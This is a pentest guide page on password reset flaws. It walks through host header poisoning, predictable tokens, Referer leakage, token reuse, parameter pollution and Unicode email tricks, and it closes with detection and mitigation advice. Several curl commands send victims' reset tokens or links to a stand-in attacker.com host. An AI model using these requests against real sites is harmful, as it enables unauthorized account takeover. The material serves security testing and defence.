% Filename: 04-web-testing/auth-session/password-reset.md
% Display name: Password Reset Vulnerabilities
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application)
% Authors: @TristanInSec

# Password Reset Vulnerabilities

## Overview

Password reset mechanisms are a common target because they provide an alternative path to account access that bypasses normal authentication. Flaws in the reset process — predictable tokens, host header manipulation, token leakage, or weak validation — allow attackers to take over accounts without knowing the original password.

Password reset is especially dangerous because it is an expected, legitimate workflow that targets rarely monitor closely, and a single flaw often leads directly to full account takeover.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Target application has a password reset (forgot password) feature
- Reset endpoint URL identified
- Knowledge of a valid email address or username on the system

## Detection Methodology

### Mapping the Reset Flow

Trigger a legitimate password reset and intercept every step:

1. Request reset: `POST /forgot-password` with email/username
2. Receive reset email (check the link format)
3. Load reset page: `GET /reset-password?token=<value>`
4. Submit new password: `POST /reset-password` with token and new password

Analyze the reset token: length, format, randomness, encoding, expiration.

## Techniques

### Host Header Poisoning

If the application uses the `Host` header to construct the reset link, the attacker can redirect the token to their server:

```bash
# curl
# https://curl.se/
# Poison the Host header — reset link will point to attacker.com
curl -s -X POST http://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"

# Variations when Host is validated
curl -s -X POST http://target.com/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@target.com"

curl -s -X POST http://target.com/forgot-password \
  -H "Host: target.com" \
  -H "X-Host: attacker.com" \
  -d "email=victim@target.com"

curl -s -X POST http://target.com/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Server: attacker.com" \
  -d "email=victim@target.com"
```

If successful, the victim receives an email with: `https://attacker.com/reset-password?token=SECRET_TOKEN`. When the victim clicks the link, the attacker's server captures the token.

### Token Predictability

**Weak token generation:**

```bash
# curl
# https://curl.se/
# Request multiple reset tokens and compare them
for i in $(seq 1 5); do
  curl -s -X POST http://target.com/forgot-password \
    -d "email=testuser@target.com" -o /dev/null
  sleep 1
done

# Check emails for patterns:
# Sequential integers: token=1001, 1002, 1003
# Timestamps: token=1707600000, 1707600001
# MD5 of email: token=0cc175b9c0f1b6a831c399e269772661
# Base64 of username+timestamp: token=dXNlcjoxNzA3NjAwMDAw
```

```bash
# Decode base64 tokens to check for predictable content
echo "dXNlcjoxNzA3NjAwMDAw" | base64 -d
# If output is "user:1707600000" — the token is timestamp-based and predictable
```

### Token Leakage via Referer Header

If the password reset page loads external resources (analytics, fonts, images), the reset token in the URL leaks via the `Referer` header:

```bash
# User clicks: https://target.com/reset-password?token=SECRET_TOKEN
# Page loads: <script src="https://analytics.example.com/track.js">
# Request to analytics includes:
# Referer: https://target.com/reset-password?token=SECRET_TOKEN
```

Test by examining the reset page source for external resource loads.

### Token Reuse and Expiration

```bash
# curl
# https://curl.se/
# Test if token works after password has been reset
curl -s -X POST http://target.com/reset-password \
  -d "token=USED_TOKEN&password=newpassword123"

# Test token expiration (use token after long delay)
# Some applications never expire reset tokens

# Test if multiple valid tokens can coexist
# Request reset twice — does the first token still work?
curl -s -X POST http://target.com/forgot-password -d "email=victim@target.com"
# (wait)
curl -s -X POST http://target.com/forgot-password -d "email=victim@target.com"
# Try the first token — if it works, tokens are not invalidated on re-request
```

### Password Reset via Parameter Manipulation

```bash
# curl
# https://curl.se/
# Test if adding a second email parameter resets the wrong account
curl -s -X POST http://target.com/forgot-password \
  -d "email=victim@target.com&email=attacker@attacker.com"

# JSON parameter pollution
curl -s -X POST http://target.com/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":["victim@target.com","attacker@attacker.com"]}'

# Test if the application sends the reset link to both addresses
```

### Account Takeover via Username/Email Manipulation

```bash
# curl
# https://curl.se/
# Unicode normalization attacks
curl -s -X POST http://target.com/forgot-password \
  -d "email=vïctim@target.com"
# Some systems normalize ï to i, sending the reset to victim@target.com
# but associating it with a different account

# Trailing/leading whitespace
curl -s -X POST http://target.com/forgot-password \
  -d "email= victim@target.com "

# Case sensitivity
curl -s -X POST http://target.com/forgot-password \
  -d "email=VICTIM@target.com"
```

### Security Questions Bypass

If the reset flow uses security questions:

```bash
# Test for common weak answers
# "What is your mother's maiden name?" — try: Smith, Johnson, Williams
# "What city were you born in?" — try: New York, London, Los Angeles

# Test if answers are case-sensitive
# Test if answers accept partial matches
# Test if brute-forcing answers is rate-limited
```

## Detection Methods

### Network-Based Detection

- Password reset requests with manipulated `Host`, `X-Forwarded-Host`, or `X-Host` headers
- Multiple reset requests for the same account in rapid succession
- Reset token submission from a different IP than the one that requested the reset
- Reset page requests with tokens from Referer headers in external requests

### Host-Based Detection

- Multiple password reset emails sent to the same account within a short window
- Successful password reset from an IP or user agent not associated with the account
- Reset token used after expiration or after another token was issued
- Password reset requests with duplicate or array email parameters

## Mitigation Strategies

- **Use cryptographic random tokens** — generate tokens with at least 128 bits of entropy using a CSPRNG. Never derive tokens from predictable values (timestamps, usernames, sequential IDs)
- **Short token expiration** — tokens should expire within 15-30 minutes and become single-use after the password is changed
- **Invalidate previous tokens** — when a new reset is requested, invalidate all previous tokens for that account
- **Ignore the Host header** — construct reset URLs from a server-side configured base URL, never from the `Host` header or any `X-Forwarded-*` variant
- **Referrer-Policy header** — set `Referrer-Policy: no-referrer` on the reset page to prevent token leakage via Referer
- **Generic response messages** — always respond with "If an account exists, a reset email was sent" regardless of whether the email is registered

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Password Reset Vulnerabilities](https://portswigger.net/web-security/authentication/other-mechanisms)
- [OWASP - Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
